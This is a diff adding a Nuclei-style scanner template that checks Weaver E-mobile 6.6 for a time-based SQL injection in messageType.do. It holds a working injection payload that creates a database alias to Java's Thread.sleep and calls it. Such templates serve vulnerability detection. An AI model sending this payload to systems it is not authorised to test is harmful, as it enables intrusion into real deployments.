@@ -1,0 +1,47 @@
+id: poc-weaver-e-mobile-messagetype-sqli
+
+info:
+  name: 泛微E-mobile 6.6 messageType.do SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) * 1000}}"
+
+http:
+  - id: check-e-mobile
+    method: GET
+    path:
+      - "{{BaseURL}}/login.do"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "E-Mobile"
+
+  - id: sqli-test
+    method: POST
+    path:
+      - "{{BaseURL}}/messageType.do"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |-
+      method=create&typeName=1';CREATE ALIAS sleep222 FOR "java.lang.Thread.sleep";CALL sleep222({{t2}});select+'1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "status"
+      - type: dsl
+        dsl:
+          - "duration > t1"
